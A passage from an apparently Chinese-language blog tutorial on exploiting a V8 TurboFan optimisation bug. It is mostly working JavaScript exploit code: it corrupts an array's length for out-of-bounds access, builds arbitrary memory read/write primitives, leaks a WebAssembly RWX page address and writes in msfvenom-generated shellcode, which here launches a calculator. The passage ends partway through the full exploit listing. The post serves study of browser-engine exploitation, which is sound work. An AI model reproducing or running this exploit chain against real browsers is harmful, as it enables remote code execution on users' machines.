class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    opt_me(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 简单 checker</span></span><br><span class="line"><span class="keyword">if</span>(oob_arr[<span class="number">1023</span>] == <span class="literal">undefined</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"OOB Fail!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] oob_arr.length == "</span> + oob_arr.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 任意地址读写原语 -- *******/</span></span><br><span class="line"><span class="keyword">var</span> array_buffer;</span><br><span class="line">array_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x233</span>);</span><br><span class="line">data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(array_buffer);</span><br><span class="line">backing_store_offset = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定backing_store_offset</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// smi(0x233) == 0x0000023300000000</span></span><br><span class="line">    <span class="keyword">if</span>(Float64ToInt64(oob_arr[i]) == <span class="number">0x0000023300000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        backing_store_offset = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 简单确认一下是否成功找到 backing_store</span></span><br><span class="line"><span class="keyword">if</span>(backing_store_offset == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"backing_store is not found!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] backing_store offset: "</span> + backing_store_offset);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_8bytes</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line">    <span class="keyword">return</span> data_view.getBigInt64(<span class="number">0</span>, <span class="literal">true</span>); <span class="comment">// true 设置小端序</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_8bytes</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line">    data_view.setBigInt64(<span class="number">0</span>, BigInt(data), <span class="literal">true</span>); <span class="comment">// true 设置小端序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- try arbitrary read/write -- *******/</span></span><br><span class="line"><span class="comment">// 试着读取地址为 0xdeaddead 的内存</span></span><br><span class="line">read_8bytes(<span class="number">0xdeaddead</span>);</span><br><span class="line"><span class="comment">// 试着写入地址为 0xdeaddead 的内存</span></span><br><span class="line">write_8bytes(<span class="number">0xdeaddead</span>, <span class="number">0x89abcdef</span>);</span><br></pre></td></tr></table></figure>
<p>测试结果如下：</p>
<blockquote>
<p>注：单次只能测试任意读或任意写，不能同时测试。</p>
</blockquote>
<ul>
<li>
<p>可以将目标数据写入目标地址：</p>
<p><img src="/2021/01/v8-turboFan/debugprint12.png" alt="img"></p>
</li>
<li>
<p>可以从目标地址中读出数据</p>
<p><img src="/2021/01/v8-turboFan/debugprint13.png" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h4 id="c-泄露-RWX-地址">c. 泄露 RWX 地址</h4>
<ul>
<li>
<p>由于 v8 已经<a href="https://source.chromium.org/chromium/v8/v8.git/+/dde25872f58951bb0148cf43d6a504ab2f280485:src/flag-definitions.h;l=717" target="_blank" rel="noopener">取消</a>将 <strong>JIT 编码的 JSFunction</strong> 放入 RWX 内存中 ，因此我们必须另找它法。根据所搜索到的利用方式，有以下两种：</p>
<ol>
<li>
<p>将 Array 的 JSFunction 写入内存并泄露，之后就可以进一步泄露 JSFunction 中的 code 指针。由于这个Code指针指向 chromium 二进制文件内部，因此我们可以将二进制文件拖入 IDA 中计算相对位移，获取 <strong>代码基地址 =&gt; GOT表条目 =&gt; libc基地址 =&gt; enviroment指针</strong>，这样就可以获取到可写的栈地址以及<code>mprotect</code>地址。</p>
<p>然后将 shellcode 写入栈里并 ROP 调用 mprotect 修改执行权限，最后跳转执行，这样就可以成功执行 shellcode。</p>
<blockquote>
<p>此方法来自 Sakura 师傅，第四条参考链接。</p>
</blockquote>
</li>
<li>
<p>v8 除了编译 JS 以外还编译 WebAssembly （wasm）代码，而 wasm 模块至今仍然<a href="https://source.chromium.org/chromium/chromium/src/+/1bc5adc2c0e057fb0fb91afa0c534dada924f90e:v8/src/flags/flag-definitions.h;l=790" target="_blank" rel="noopener">使用</a> RWX 内存，因此我们可以试着将 shellcode 写入这块内存中并执行，不过这个方法有点折腾。</p>
<blockquote>
<p>此方法来自 doar-e，第一条参考链接。</p>
</blockquote>
</li>
</ol>
<p>第一种利用方式非常的直接，利用起来应该没有太大的难度。因此出于学习的目的，我们选择第二种方式，学习一下 WebAssembly 的利用方式。</p>
</li>
<li>
<p>通过查阅这片文章 <a href="https://www.anquanke.com/post/id/150923" target="_blank" rel="noopener">浅谈如何逆向分析WebAssembly二进制文件 - 安全客</a>，我们可以获取到wasm的简易使用方式，并通过这个方式获取到 Wasm 的 JSFunction：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode),&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> WasmJSFunction = m.exports.func;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>而对于一个 Wasm 的 JSFunction，我们可以通过以下路径来获取 RWX 段地址：</p>
<blockquote>
<p>这条路径稍微有点长：JSFunction  -&gt; SharedFunctionInfo -&gt; WasmExportedFunctionData -&gt; WasmInstanceObject -&gt; JumpTableStart。</p>
</blockquote>
<ul>
<li>
<p>从 JSFunction 出发，获取其 SharedFunctionInfo（相对偏移为 0x18）</p>
<p><img src="/2021/01/v8-turboFan/debugprint6.png" alt="img"></p>
</li>
<li>
<p>之后从 SharedFunctionInfo 获取其 WasmExportedFunctionData（相对偏移为 0x8）</p>
<p><img src="/2021/01/v8-turboFan/debugprint7.png" alt="img"></p>
</li>
<li>
<p>再从 WasmExportedFunctionData 中获取 WasmInstanceObject（相对偏移为 0x10）</p>
<p><img src="/2021/01/v8-turboFan/debugprint8.png" alt="img"></p>
</li>
<li>
<p>最后从 WasmInstanceObject 中获取 JumpTableStart（相对偏移为 0xe8）</p>
<p><img src="/2021/01/v8-turboFan/debugprint9.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p>查看获取到的 JumpTableStart 位置处的数据，我们可以发现这里是一串汇编代码。给该位置下断，并在 JS 中执行一下 Wasm 的 JSFunction ，我们可以发现控制流被断点成功捕获：</p>
<p><img src="/2021/01/v8-turboFan/debugprint10.png" alt="img"></p>
<p>以下是测试用的 JS 代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span><br><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode),&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> WasmJSFunction = m.exports.func;</span><br><span class="line"><span class="comment">// 输出一下 Wasm JSFunction 地址，并获取其 JumpTableStart</span></span><br><span class="line">%DebugPrint(WasmJSFunction);</span><br><span class="line"><span class="comment">// 之后在 gdb 中给 JumpTableStart 下个断点</span></span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="comment">// 尝试执行 Wasm JSFunction</span></span><br><span class="line">WasmJSFunction();</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>现在情况已经非常明了了，通过之前构建的任意地址读取原语，一步步读取 Wasm JSFunction 的各个属性并最终获取 RWX 内存地址：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prettyHex</span>(<span class="params">bigint</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"0x"</span> + BigInt.asUintN(<span class="number">64</span>,bigint).toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">'0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode),&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> WasmJSFunction = m.exports.func;</span><br><span class="line"><span class="comment">// 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上</span></span><br><span class="line"><span class="comment">// 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址</span></span><br><span class="line"><span class="keyword">var</span> WasmJSFunctionObj = &#123;<span class="attr">guard</span>: Int64ToFloat64(<span class="number">0x233333</span>), <span class="attr">wasmAddr</span>: WasmJSFunction&#125;;</span><br><span class="line"><span class="keyword">var</span> WasmJSFunctionIndex = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// 查找哨兵值</span></span><br><span class="line">    <span class="keyword">if</span>(Float64ToInt64(oob_arr[i]) == <span class="number">0x233333</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        WasmJSFunctionIndex = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单确认一下是否成功找到 WasmJSFunctionAddr</span></span><br><span class="line"><span class="keyword">if</span>(WasmJSFunctionIndex == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"WasmJSFunctionAddr is not found!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] find WasmJSFunctionAddr offset: "</span> + WasmJSFunctionIndex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 WasmJSFunction 地址</span></span><br><span class="line">WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmJSFunction address: "</span> + prettyHex(WasmJSFunctionAddr));</span><br><span class="line"><span class="comment">// 获取 SharedFunctionInfo 地址</span></span><br><span class="line">SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(<span class="number">0x18</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find SharedFunctionInfoAddr address: "</span> + prettyHex(SharedFunctionInfoAddr));</span><br><span class="line"><span class="comment">// 获取 WasmExportedFunctionData 地址</span></span><br><span class="line">WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(<span class="number">0x8</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmExportedFunctionDataAddr address: "</span> + prettyHex(WasmExportedFunctionDataAddr));</span><br><span class="line"><span class="comment">// 获取 WasmInstanceObject 地址</span></span><br><span class="line">WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(<span class="number">0x10</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmInstanceObjectAddr address: "</span> + prettyHex(WasmInstanceObjectAddr));</span><br><span class="line"><span class="comment">// 获取 JumpTableStart 地址</span></span><br><span class="line">JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(<span class="number">0xe8</span>));</span><br><span class="line">log(<span class="string">"[+] find JumpTableStartAddr address: "</span> + prettyHex(JumpTableStartAddr));</span><br></pre></td></tr></table></figure>
<p>需要注意的是，在读取<code>WasmExportedFunctionDataAddr</code>时会触发 debug 的越界检查：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/code-stub-assembler.cc</span></span><br><span class="line"><span class="comment">// in CodeStubAssembler::FixedArrayBoundsCheck</span></span><br><span class="line">CSA_CHECK(<span class="keyword">this</span>, UintPtrLessThan(effective_index,</span><br><span class="line">                                  LoadAndUntagFixedArrayBaseLength(<span class="built_in">array</span>)));</span><br></pre></td></tr></table></figure>
<p>注释掉再重新编译即可。</p>
</li>
</ul>
<h4 id="d-shellcode">d. shellcode</h4>
<p>最后我们只要将 shellcode 写入该 RWX 地址处并调用 Wasm JSFunction 即可成功执行 shellcode。</p>
<p>使用 msfvenom 生成满足以下条件的 shellcode:</p>
<ul>
<li>
<p>payload为 <code>linux x64</code></p>
</li>
<li>
<p>格式为 C语言</p>
</li>
<li>
<p>命令为<code>DISPLAY=:0 gnome-calculator</code></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/<span class="built_in">exec</span> CMD=<span class="string">'DISPLAY=:0 gnome-calculator'</span> -f c</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Payload size: <span class="number">67</span> bytes</span><br><span class="line">Final size of c file: <span class="number">307</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"</span></span><br><span class="line"><span class="string">"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x1c\x00"</span></span><br><span class="line"><span class="string">"\x00\x00\x44\x49\x53\x50\x4c\x41\x59\x3d\x3a\x30\x20\x67\x6e"</span></span><br><span class="line"><span class="string">"\x6f\x6d\x65\x2d\x63\x61\x6c\x63\x75\x6c\x61\x74\x6f\x72\x00"</span></span><br><span class="line"><span class="string">"\x56\x57\x48\x89\xe6\x0f\x05"</span>;</span><br></pre></td></tr></table></figure>
<h4 id="e-exploit">e. exploit</h4>
<ul>
<li>
<p>结合上面的内容，release 版本 v8 的 exp 如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">msg</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(msg);</span><br><span class="line">    <span class="comment">// var elem = document.getElementById("#log");</span></span><br><span class="line">    <span class="comment">// elem.innerText += '[+] ' + msg + '\n';</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> transformBuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> bigIntArray = <span class="keyword">new</span> BigInt64Array(transformBuffer);</span><br><span class="line"><span class="keyword">var</span> floatArray = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(transformBuffer);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64ToFloat64</span>(<span class="params">int</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigIntArray[<span class="number">0</span>] = BigInt(int);</span><br><span class="line">    <span class="keyword">return</span> floatArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Float64ToInt64</span>(<span class="params">float</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = float;</span><br><span class="line">    <span class="keyword">return</span> bigIntArray[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 修改JSArray length 的操作 -- *******/</span></span><br><span class="line"><span class="keyword">var</span> oob_arr = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt_me</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_arr = [<span class="number">1.0</span>, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>];</span><br><span class="line">    <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span><br><span class="line">    t = t + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">    t -= <span class="number">9007199254740990</span>;</span><br><span class="line">    t *= <span class="number">2</span>;</span><br><span class="line">    t += <span class="number">2</span>;</span><br><span class="line">    oob_arr[t] = <span class="number">3.4766779039175022e-310</span>; <span class="comment">// 0x4000.f2smi</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 试着触发 turboFan，从而修改 JSArray 的 length</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    opt_me(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 简单 checker</span></span><br><span class="line"><span class="keyword">if</span>(oob_arr[<span class="number">1023</span>] == <span class="literal">undefined</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"OOB Fail!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] oob_arr.length == "</span> + oob_arr.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 任意地址读写原语 